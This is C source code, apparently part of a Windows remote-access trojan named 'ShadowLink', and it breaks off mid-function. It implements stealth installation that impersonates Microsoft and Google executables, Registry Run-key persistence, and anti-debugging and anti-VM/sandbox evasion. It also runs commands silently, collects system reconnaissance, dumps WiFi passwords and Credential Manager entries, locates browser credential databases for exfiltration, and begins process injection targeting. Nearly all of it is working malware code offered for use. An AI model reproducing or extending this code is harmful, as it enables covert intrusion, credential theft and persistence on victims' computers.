int copy_and_rename(const char *new_path) {
    char exePath[MAX_PATH];
    
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // Copier le fichier
    if (!CopyFileA(exePath, new_path, FALSE)) {
        return -2;
    }
    
    // Cacher le nouveau fichier
    DWORD attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    SetFileAttributesA(new_path, attributes);
    
    return 0;
}

// ============================================
// ADVANCED INSTALLATION - Full Stealth Install
// ============================================

// Possible installation profiles (name + path)
typedef struct {
    const char *folder;      // Subfolder in AppData
    const char *filename;    // Executable name
    const char *regname;     // Registry key name for persistence
} INSTALL_PROFILE;

static const INSTALL_PROFILE g_InstallProfiles[] = {
    {"Microsoft\\Windows\\RuntimeBroker", "RuntimeBroker.exe", "WindowsRuntime"},
    {"Microsoft\\Windows\\Security\\Health", "SecurityHealthSystray.exe", "SecurityHealth"},
    {"Microsoft\\WindowsApps", "WinStore.App.exe", "WindowsStore"},
    {"Microsoft\\Windows\\Explorer", "SearchProtocol.exe", "SearchProtocol"},
    {"Microsoft\\OneDrive\\Update", "OneDriveUpdater.exe", "OneDriveUpdate"},
    {"Google\\Update", "GoogleUpdate.exe", "GoogleUpdate"},
    {"Microsoft\\Teams\\Update", "TeamsUpdater.exe", "TeamsUpdate"}
};
#define NUM_INSTALL_PROFILES (sizeof(g_InstallProfiles) / sizeof(g_InstallProfiles[0]))

// Create directory recursively
int create_directory_recursive(const char *path) {
    char temp[MAX_PATH];
    char *p = NULL;
    size_t len;
    
    snprintf(temp, sizeof(temp), "%s", path);
    len = strlen(temp);
    
    // Remove trailing slash
    if (temp[len - 1] == '\\') {
        temp[len - 1] = '\0';
    }
    
    // Create each directory in the path
    for (p = temp + 1; *p; p++) {
        if (*p == '\\') {
            *p = '\0';
            CreateDirectoryA(temp, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(temp, NULL);
    
    return 0;
}

// Full stealth installation with persistence
int install_stealth(char *result, size_t result_size) {
    char exePath[MAX_PATH];
    char newPath[MAX_PATH];
    char targetDir[MAX_PATH];
    char appData[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    // Get current executable path
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        snprintf(result, result_size, "[!] Cannot get current path\n");
        return -1;
    }
    
    // Get AppData Local
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData) != S_OK) {
        snprintf(result, result_size, "[!] Cannot get AppData path\n");
        return -2;
    }
    
    // Randomly select an installation profile
    srand((unsigned int)GetTickCount());
    int profile_idx = rand() % NUM_INSTALL_PROFILES;
    const INSTALL_PROFILE *profile = &g_InstallProfiles[profile_idx];
    
    // Build target path
    snprintf(targetDir, sizeof(targetDir), "%s\\%s", appData, profile->folder);
    snprintf(newPath, sizeof(newPath), "%s\\%s", targetDir, profile->filename);
    
    // Check if already installed at this location
    if (_stricmp(exePath, newPath) == 0) {
        snprintf(result, result_size,
            "[*] Already installed at stealth location!\n"
            "    Path: %s\n"
            "    Profile: %s\n",
            newPath, profile->filename);
        return 1;
    }
    
    // Create directory structure
    create_directory_recursive(targetDir);
    
    // Copy executable
    if (!CopyFileA(exePath, newPath, FALSE)) {
        snprintf(result, result_size,
            "[!] Copy failed: %s\n"
            "[*] Error: %lu\n", newPath, GetLastError());
        return -3;
    }
    
    // Set hidden + system attributes on file
    SetFileAttributesA(newPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // Add persistence via registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, profile->regname, 0, REG_SZ, 
            (BYTE*)newPath, (DWORD)strlen(newPath) + 1);
        RegCloseKey(hKey);
    }
    
    // Prepare to launch new instance
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    // Launch new instance from stealth location
    if (CreateProcessA(newPath, NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        
        snprintf(result, result_size,
            "╔══════════════════════════════════════════════════════╗\n"
            "║         STEALTH INSTALLATION COMPLETE                ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            "║ [+] Copied to: %-38s ║\n"
            "║ [+] Filename: %-39s ║\n"
            "║ [+] Attributes: HIDDEN + SYSTEM                      ║\n"
            "║ [+] Persistence: %s (Registry Run)       ║\n"
            "║ [+] New instance PID: %-31lu ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            "║ [!] This instance will terminate.                    ║\n"
            "║ [*] New agent connecting shortly...                  ║\n"
            "╚══════════════════════════════════════════════════════╝\n",
            targetDir, profile->filename, profile->regname, pi.dwProcessId);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return (int)pi.dwProcessId;  // Return new PID to signal success
    } else {
        snprintf(result, result_size,
            "[+] Installed but failed to launch new instance\n"
            "    Path: %s\n"
            "    Restart manually or reboot.\n", newPath);
        return 0;
    }
}

// Legacy function - redirects to new stealth install
int install_hidden(char *result, size_t result_size) {
    return install_stealth(result, result_size);
}


// ============================================
// EVASION - ANTI-DEBUG
// ============================================

int check_debugger_present() {
    // Méthode 1: IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return 1;
    }
    
    // Méthode 2: CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
        if (debuggerPresent) {
            return 1;
        }
    }
    
    return 0;
}

int check_timing_attack() {
    // Mesure le temps pour une opération simple
    // Si c'est trop long, on est probablement en debug
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Opération simple
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += i;
    }
    
    QueryPerformanceCounter(&end);
    
    // Calcul du temps en millisecondes
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000;
    
    // Si > 50ms pour cette opération simple, c'est suspect
    if (elapsed > 50.0) {
        return 1;
    }
    
    return 0;
}

int is_debugged() {
    if (!stealth_mode) return 0;
    
    return check_debugger_present() || check_timing_attack();
}


// ============================================
// EVASION - ANTI-VM / ANTI-SANDBOX
// ============================================

// Liste des noms de PC suspects
const char *suspicious_pc_names[] = {
    "SANDBOX", "VIRUS", "MALWARE", "ANALYSIS", "SAMPLE",
    "TEST", "CUCKOO", "ANALYST", "VBOX", "VMWARE", NULL
};

// Liste des noms d'utilisateurs suspects
const char *suspicious_usernames[] = {
    "admin", "administrator", "user", "test", "sandbox",
    "virus", "malware", "analyst", "vmware", "vbox", NULL
};

// Liste des processus de VM/Sandbox
const char *vm_processes[] = {
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
    "vboxservice.exe", "vboxtray.exe",
    "sandboxiedcomlaunch.exe", "sandboxierpcss.exe",
    "procmon.exe", "procexp.exe", "wireshark.exe",
    "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
    "ollydbg.exe", "ida.exe", "ida64.exe", NULL
};

int check_suspicious_computername() {
    char computerName[256];
    DWORD size = sizeof(computerName);
    
    if (!GetComputerNameA(computerName, &size)) {
        return 0;
    }
    
    // Convertir en majuscules
    for (int i = 0; computerName[i]; i++) {
        computerName[i] = toupper(computerName[i]);
    }
    
    // Vérifier contre la liste
    for (int i = 0; suspicious_pc_names[i] != NULL; i++) {
        if (strstr(computerName, suspicious_pc_names[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

int check_suspicious_username() {
    char username[256];
    DWORD size = sizeof(username);
    
    if (!GetUserNameA(username, &size)) {
        return 0;
    }
    
    // Convertir en minuscules
    for (int i = 0; username[i]; i++) {
        username[i] = tolower(username[i]);
    }
    
    // Vérifier contre la liste
    for (int i = 0; suspicious_usernames[i] != NULL; i++) {
        if (strcmp(username, suspicious_usernames[i]) == 0) {
            return 1;
        }
    }
    
    return 0;
}

int check_low_resources() {
    // Vérifier la RAM (< 2GB = suspect)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    DWORDLONG totalRAM_GB = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
    if (totalRAM_GB < 2) {
        return 1;
    }
    
    // Vérifier le nombre de CPU (< 2 = suspect)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return 1;
    }
    
    return 0;
}

int check_vm_processes() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }
    
    int found = 0;
    do {
        // Convertir en minuscules
        char procName[MAX_PATH];
        strncpy(procName, pe32.szExeFile, MAX_PATH);
        for (int i = 0; procName[i]; i++) {
            procName[i] = tolower(procName[i]);
        }
        
        // Vérifier contre la liste
        for (int i = 0; vm_processes[i] != NULL; i++) {
            if (strcmp(procName, vm_processes[i]) == 0) {
                found = 1;
                break;
            }
        }
        
        if (found) break;
        
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return found;
}

int is_virtual_machine() {
    if (!stealth_mode) return 0;
    
    return check_suspicious_computername() || 
           check_suspicious_username() || 
           check_low_resources() ||
           check_vm_processes();
}


// ============================================
// EVASION - COMPORTEMENT
// ============================================

void evasion_exit() {
    // Sortie silencieuse - pas de message, pas de trace
    WSACleanup();
    ExitProcess(0);
}

int perform_evasion_checks() {
    if (!stealth_mode) return 0;
    
    // Anti-Debug
    if (is_debugged()) {
        // Attendre un peu pour ne pas être évident
        Sleep(rand() % 5000 + 1000);
        return 1;
    }
    
    // Anti-VM
    if (is_virtual_machine()) {
        // Attendre un peu
        Sleep(rand() % 5000 + 1000);
        return 1;
    }
    
    return 0;
}


// Clé partagée (32 bytes)
static const uint8_t AES_KEY[32] = "ShadowLinkAES256SecretKey32Bytes";

// Génère un IV aléatoire
void generate_iv(uint8_t *iv) {
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 16; i++) {
        iv[i] = rand() % 256;
    }
}

// Padding PKCS7
size_t pkcs7_pad(uint8_t *data, size_t len, size_t block_size) {
    size_t padding = block_size - (len % block_size);
    for (size_t i = 0; i < padding; i++) {
        data[len + i] = (uint8_t)padding;
    }
    return len + padding;
}

// Unpadding PKCS7
size_t pkcs7_unpad(uint8_t *data, size_t len) {
    uint8_t padding = data[len - 1];
    return len - padding;
}

// Chiffre les données (retourne IV + encrypted)
size_t aes_encrypt(const uint8_t *input, size_t input_len, uint8_t *output) {
    uint8_t iv[16];
    generate_iv(iv);
    
    // Copier l'IV au début de l'output
    memcpy(output, iv, 16);
    
    // Copier et padder les données
    uint8_t *padded = output + 16;
    memcpy(padded, input, input_len);
    size_t padded_len = pkcs7_pad(padded, input_len, 16);
    
    // Chiffrer
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, iv);
    AES_CBC_encrypt_buffer(&ctx, padded, padded_len);
    
    return 16 + padded_len;  // IV + encrypted data
}

// Déchiffre les données
size_t aes_decrypt(const uint8_t *input, size_t input_len, uint8_t *output) {
    uint8_t iv[16];
    memcpy(iv, input, 16);
    
    size_t encrypted_len = input_len - 16;
    memcpy(output, input + 16, encrypted_len);
    
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, iv);
    AES_CBC_decrypt_buffer(&ctx, output, encrypted_len);
    
    return pkcs7_unpad(output, encrypted_len);
}




// ============================================
// SILENT COMMAND EXECUTION (NO WINDOW FLASH)
// Uses CreateProcess with CREATE_NO_WINDOW
// ============================================

int execute_command_silent(const char *command, char *output, size_t output_size) {
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hStdOutRead = NULL;
    HANDLE hStdOutWrite = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    DWORD bytesRead;
    DWORD totalRead = 0;
    char fullCommand[BUFFER_SIZE];
    BOOL success;
    
    // Set up security attributes for pipe inheritance
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    
    // Create pipe for stdout
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
        snprintf(output, output_size, "[!] Failed to create pipe\n");
        return -1;
    }
    
    // Ensure read handle is not inherited
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    
    // Set up STARTUPINFO
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    si.hStdInput = NULL;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hidden window
    
    ZeroMemory(&pi, sizeof(pi));
    
    // Build command with UTF-8 codepage
    snprintf(fullCommand, sizeof(fullCommand), "cmd.exe /c chcp 65001 >nul && %s 2>&1", command);
    
    // Create process with NO WINDOW
    success = CreateProcessA(
        NULL,           // No module name
        fullCommand,    // Command line
        NULL,           // Process security
        NULL,           // Thread security
        TRUE,           // Inherit handles
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,  // NO CONSOLE WINDOW!
        NULL,           // Use parent environment
        NULL,           // Use parent directory
        &si,            // Startup info
        &pi             // Process info
    );
    
    // Close write end of pipe (parent doesn't need it)
    CloseHandle(hStdOutWrite);
    
    if (!success) {
        CloseHandle(hStdOutRead);
        snprintf(output, output_size, "[!] Failed to execute command (err=%lu)\n", GetLastError());
        return -1;
    }
    
    // Read output from pipe
    output[0] = '\0';
    while (totalRead < output_size - 1) {
        DWORD available = 0;
        if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &available, NULL)) break;
        if (available == 0) {
            // Check if process ended
            if (WaitForSingleObject(pi.hProcess, 10) == WAIT_OBJECT_0) {
                // One more read attempt
                if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &available, NULL) || available == 0)
                    break;
            }
            continue;
        }
        
        DWORD toRead = (available < output_size - totalRead - 1) ? available : (output_size - totalRead - 1);
        if (!ReadFile(hStdOutRead, output + totalRead, toRead, &bytesRead, NULL) || bytesRead == 0)
            break;
        totalRead += bytesRead;
    }
    output[totalRead] = '\0';
    
    // Wait for process to finish (max 30 seconds)
    WaitForSingleObject(pi.hProcess, 30000);
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdOutRead);
    
    if (totalRead == 0) {
        snprintf(output, output_size, "[*] Commande executee (pas de sortie)\n");
    }
    
    return 0;
}

// Wrapper for backwards compatibility (calls silent version)
int execute_command(const char *command, char *output, size_t output_size) {
    return execute_command_silent(command, output, output_size);
}


// Fonction de reconnaissance - collecte toutes les infos système
int do_recon(char *output, size_t output_size) {
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    FILE *fp;
    char cmdOutput[BUFFER_SIZE];
    size_t offset = 0;
    
    // Créer un fichier temporaire
    GetTempPathA(MAX_PATH, tempPath);
    snprintf(tempFile, MAX_PATH, "%s\\recon_%lu.txt", tempPath, GetCurrentProcessId());
    
    fp = fopen(tempFile, "w");
    if (fp == NULL) {
        snprintf(output, output_size, "[!] Erreur creation fichier recon\n");
        return -1;
    }
    
    // Header
    fprintf(fp, "========================================\n");
    fprintf(fp, "   SHADOWLINK RECONNAISSANCE REPORT\n");
    fprintf(fp, "========================================\n\n");
    
    // 1. SYSINFO
    fprintf(fp, "[+] === SYSTEM INFO ===\n");
    execute_command("systeminfo | findstr /B /C:\"OS\" /C:\"System\" /C:\"Total Physical\"", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 2. WHOAMI
    fprintf(fp, "[+] === CURRENT USER ===\n");
    execute_command("whoami", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 3. PWD
    fprintf(fp, "[+] === CURRENT DIRECTORY ===\n");
    execute_command("cd", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 4. LS (répertoire courant)
    fprintf(fp, "[+] === DIRECTORY LISTING ===\n");
    execute_command("dir", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 5. IPCONFIG
    fprintf(fp, "[+] === NETWORK CONFIG ===\n");
    execute_command("ipconfig /all", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    // 6. NETSTAT
    fprintf(fp, "[+] === ACTIVE CONNECTIONS ===\n");
    execute_command("netstat -ano", cmdOutput, sizeof(cmdOutput));
    fprintf(fp, "%s\n", cmdOutput);
    
    fprintf(fp, "========================================\n");
    fprintf(fp, "   END OF REPORT\n");
    fprintf(fp, "========================================\n");
    
    fclose(fp);
    
    // Lire le fichier complet
    fp = fopen(tempFile, "rb");
    if (fp == NULL) {
        snprintf(output, output_size, "[!] Erreur lecture fichier recon\n");
        return -1;
    }
    
    size_t bytesRead = fread(output, 1, output_size - 1, fp);
    output[bytesRead] = '\0';
    fclose(fp);
    
    // Supprimer le fichier temporaire
    DeleteFileA(tempFile);
    
    return (int)bytesRead;
}


// ============================================
// PERSISTANCE - Registre Windows
// ============================================

int install_persistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    char persistName[] = "WindowsSecurityHealth";  // Nom discret
    
    // Obtenir le chemin de l'exécutable actuel
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // Ouvrir la clé Run du registre
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return -1;
    }
    
    // Ajouter la valeur
    if (RegSetValueExA(hKey, persistName, 0, REG_SZ, 
                       (BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }
    
    RegCloseKey(hKey);
    return 0;
}

int remove_persistence() {
    HKEY hKey;
    char persistName[] = "WindowsSecurityHealth";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return -1;
    }
    
    RegDeleteValueA(hKey, persistName);
    RegCloseKey(hKey);
    return 0;
}

int check_persistence() {
    HKEY hKey;
    char persistName[] = "WindowsSecurityHealth";
    char value[MAX_PATH];
    DWORD valueLen = MAX_PATH;
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return 0;
    }
    
    int exists = (RegQueryValueExA(hKey, persistName, NULL, NULL, 
                                   (BYTE*)value, &valueLen) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return exists;
}


// ============================================
// PHASE 9: CREDENTIAL DUMPING
// ============================================

/*
 * Credential extraction techniques:
 * 1. WiFi passwords (via netsh - no admin required for saved networks)
 * 2. Chrome/Edge passwords (SQLite + DPAPI)
 * 3. Windows Credential Manager (Vault)
 * 4. SAM dump (requires SYSTEM - not implemented here)
 */

// --------------------------------------------
// WIFI PASSWORDS (Silent - no window flash)
// --------------------------------------------

int dump_wifi_passwords(char *output, size_t output_size) {
    size_t offset = 0;
    char cmd_output[8192];
    char line[512];
    char profiles[50][64];  // Max 50 profiles
    int profile_count = 0;
    
    offset += snprintf(output + offset, output_size - offset,
        "========================================\n"
        "   WIFI CREDENTIALS DUMP\n"
        "========================================\n\n");
    
    // Get list of WiFi profiles using silent execution
    execute_command_silent("netsh wlan show profiles", cmd_output, sizeof(cmd_output));
    
    // Parse profile names from output
    char *line_start = cmd_output;
    char *line_end;
    while ((line_end = strchr(line_start, '\n')) != NULL && profile_count < 50) {
        size_t line_len = line_end - line_start;
        if (line_len < sizeof(line) - 1) {
            strncpy(line, line_start, line_len);
            line[line_len] = '\0';
            
            // Look for "All User Profile" or "Profil Tous les utilisateurs"
            char *ptr = strstr(line, ": ");
            if (ptr != NULL && (strstr(line, "Profile") != NULL || strstr(line, "Profil") != NULL)) {
                ptr += 2;  // Skip ": "
                // Remove trailing spaces
                char *end = ptr + strlen(ptr) - 1;
                while (end > ptr && (*end == '\r' || *end == ' ')) {
                    *end = '\0';
                    end--;
                }
                if (strlen(ptr) > 0) {
                    strncpy(profiles[profile_count], ptr, 63);
                    profiles[profile_count][63] = '\0';
                    profile_count++;
                }
            }
        }
        line_start = line_end + 1;
    }
    
    offset += snprintf(output + offset, output_size - offset,
        "[*] Found %d WiFi profiles\n\n", profile_count);
    
    // Get password for each profile
    for (int i = 0; i < profile_count && offset < output_size - 500; i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), 
            "netsh wlan show profile name=\"%s\" key=clear", profiles[i]);
        
        execute_command_silent(cmd, cmd_output, sizeof(cmd_output));
        
        char password[128] = "N/A";
        char security[64] = "Unknown";
        
        // Parse the output
        line_start = cmd_output;
        while ((line_end = strchr(line_start, '\n')) != NULL) {
            size_t line_len = line_end - line_start;
            if (line_len < sizeof(line) - 1) {
                strncpy(line, line_start, line_len);
                line[line_len] = '\0';
                
                char *ptr;
                // Look for "Key Content" or "Contenu de la clé"
                if ((ptr = strstr(line, "Key Content")) != NULL || 
                    (ptr = strstr(line, "Contenu de la")) != NULL) {
                    ptr = strstr(line, ": ");
                    if (ptr != NULL) {
                        ptr += 2;
                        char *end = ptr + strlen(ptr) - 1;
                        while (end > ptr && (*end == '\r')) {
                            *end = '\0';
                            end--;
                        }
                        strncpy(password, ptr, 127);
                    }
                }
                // Look for authentication type
                if ((ptr = strstr(line, "Authentication")) != NULL ||
                    (ptr = strstr(line, "Authentification")) != NULL) {
                    ptr = strstr(line, ": ");
                    if (ptr != NULL) {
                        ptr += 2;
                        char *end = ptr + strlen(ptr) - 1;
                        while (end > ptr && (*end == '\r')) {
                            *end = '\0';
                            end--;
                        }
                        strncpy(security, ptr, 63);
                    }
                }
            }
            line_start = line_end + 1;
        }
        
        offset += snprintf(output + offset, output_size - offset,
            "  SSID: %-25s\n"
            "  Security: %-20s\n"
            "  Password: %s\n"
            "  ----------------------------------------\n",
            profiles[i], security, password);
    }
    
    offset += snprintf(output + offset, output_size - offset,
        "\n[+] WiFi dump complete\n");
    
    return (int)offset;
}


// --------------------------------------------
// CHROME/EDGE CREDENTIALS (requires file copy + DPAPI)
// --------------------------------------------

// Note: Full Chrome password decryption requires:
// 1. Copy Login Data SQLite file (Chrome locks it)
// 2. Read encrypted passwords
// 3. Decrypt with DPAPI (CryptUnprotectData)
// For simplicity, we'll extract what we can and note limitations

int dump_browser_credentials(char *output, size_t output_size) {
    size_t offset = 0;
    
    offset += snprintf(output + offset, output_size - offset,
        "========================================\n"
        "   BROWSER CREDENTIALS INFO\n"
        "========================================\n\n");
    
    // Check Chrome
    char chrome_path[MAX_PATH];
    if (ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        chrome_path, MAX_PATH) > 0) {
        
        if (GetFileAttributesA(chrome_path) != INVALID_FILE_ATTRIBUTES) {
            offset += snprintf(output + offset, output_size - offset,
                "[+] Chrome Login Data found:\n    %s\n\n", chrome_path);
            
            // Get Chrome version
            char chrome_version[MAX_PATH];
            if (ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Last Version",
                chrome_version, MAX_PATH) > 0) {
                FILE *vf = fopen(chrome_version, "r");
                if (vf) {
                    char version[64] = "Unknown";
                    fgets(version, sizeof(version), vf);
                    fclose(vf);
                    offset += snprintf(output + offset, output_size - offset,
                        "    Chrome Version: %s\n", version);
                }
            }
        } else {
            offset += snprintf(output + offset, output_size - offset,
                "[-] Chrome credentials not found\n\n");
        }
    }
    
    // Check Edge (Chromium)
    char edge_path[MAX_PATH];
    if (ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        edge_path, MAX_PATH) > 0) {
        
        if (GetFileAttributesA(edge_path) != INVALID_FILE_ATTRIBUTES) {
            offset += snprintf(output + offset, output_size - offset,
                "[+] Edge Login Data found:\n    %s\n\n", edge_path);
        } else {
            offset += snprintf(output + offset, output_size - offset,
                "[-] Edge credentials not found\n\n");
        }
    }
    
    // Check Firefox
    char firefox_path[MAX_PATH];
    if (ExpandEnvironmentStringsA(
        "%APPDATA%\\Mozilla\\Firefox\\Profiles",
        firefox_path, MAX_PATH) > 0) {
        
        if (GetFileAttributesA(firefox_path) != INVALID_FILE_ATTRIBUTES) {
            offset += snprintf(output + offset, output_size - offset,
                "[+] Firefox profiles found:\n    %s\n\n", firefox_path);
        }
    }
    
    offset += snprintf(output + offset, output_size - offset,
        "----------------------------------------\n"
        "[*] Note: Full extraction requires:\n"
        "    1. Copy database (browser locks it)\n"
        "    2. DPAPI decryption\n"
        "    Use 'download <path>' to exfiltrate\n"
        "----------------------------------------\n");
    
    return (int)offset;
}


// --------------------------------------------
// WINDOWS CREDENTIAL MANAGER (Silent)
// --------------------------------------------

int dump_windows_credentials(char *output, size_t output_size) {
    size_t offset = 0;
    char cmd_output[8192];
    
    offset += snprintf(output + offset, output_size - offset,
        "========================================\n"
        "   WINDOWS CREDENTIAL MANAGER\n"
        "========================================\n\n");
    
    // Use cmdkey to list credentials - silent execution
    execute_command_silent("cmdkey /list", cmd_output, sizeof(cmd_output));
    
    // Copy output (truncate if needed)
    size_t copy_len = strlen(cmd_output);
    if (copy_len > output_size - offset - 200) {
        copy_len = output_size - offset - 200;
    }
    memcpy(output + offset, cmd_output, copy_len);
    offset += copy_len;
    
    offset += snprintf(output + offset, output_size - offset,
        "\n----------------------------------------\n"
        "[*] Note: Passwords are not displayed\n"
        "    (Windows security restriction)\n"
        "    Mimikatz/lazagne needed for values\n"
        "----------------------------------------\n");
    
    return (int)offset;
}


// --------------------------------------------
// MASTER CREDENTIAL DUMP FUNCTION
// --------------------------------------------

int dump_all_credentials(char *output, size_t output_size) {
    size_t offset = 0;
    char temp_buffer[16384];
    
    offset += snprintf(output + offset, output_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║           SHADOWLINK CREDENTIAL DUMP                     ║\n"
        "║                    Phase 9                               ║\n"
        "╚══════════════════════════════════════════════════════════╝\n\n");
    
    // WiFi passwords
    dump_wifi_passwords(temp_buffer, sizeof(temp_buffer));
    offset += snprintf(output + offset, output_size - offset, "%s\n", temp_buffer);
    
    // Browser info
    dump_browser_credentials(temp_buffer, sizeof(temp_buffer));
    offset += snprintf(output + offset, output_size - offset, "%s\n", temp_buffer);
    
    // Windows Credential Manager
    dump_windows_credentials(temp_buffer, sizeof(temp_buffer));
    offset += snprintf(output + offset, output_size - offset, "%s\n", temp_buffer);
    
    offset += snprintf(output + offset, output_size - offset,
        "\n═══════════════════════════════════════════════════════════\n"
        "[+] Credential dump complete\n"
        "═══════════════════════════════════════════════════════════\n");
    
    return (int)offset;
}


// ============================================
// PHASE 9b: PROCESS INJECTION
// ============================================

/*
 * Process Injection Techniques:
 * 1. Classic Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
 * 2. APC Injection (QueueUserAPC)
 * 3. Thread Hijacking
 * 
 * These allow code execution in another process's context,
 * making detection harder and bypassing some security tools.
 */

// Find a suitable target process for injection
DWORD find_injection_target(const char *target_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }
    
    DWORD target_pid = 0;
    
    do {
        // Convert to lowercase for comparison
        char procName[MAX_PATH];
        strncpy(procName, pe32.szExeFile, MAX_PATH - 1);
        procName[MAX_PATH - 1] = '\0';
        for (int i = 0; procName[i]; i++) {
            procName[i] = tolower(procName[i]);
        }
        
        char targetLower[MAX_PATH];
        strncpy(targetLower, target_name, MAX_PATH - 1);
        targetLower[MAX_PATH - 1] = '\0';
        for (int i = 0; targetLower[i]; i++) {
            targetLower[i] = tolower(targetLower[i]);
        }
        
        if (strcmp(procName, targetLower) == 0) {
            // Don't inject into ourselves
            if (pe32.th32ProcessID != GetCurrentProcessId()) {
                target_pid = pe32.th32ProcessID;
                break;
            }
        }
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return target_pid;
}

// List suitable injection targets (common Windows processes)
int list_injection_targets(char *output, size_t output_size) {
    const char *good_targets[] = {
        "explorer.exe",     // Always running, user context
        "notepad.exe",      // If open
        "RuntimeBroker.exe", // Windows process
        "sihost.exe",       // Shell Infrastructure Host
        "taskhostw.exe",    // Task Host
        "dllhost.exe",      // COM Surrogate
        NULL
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
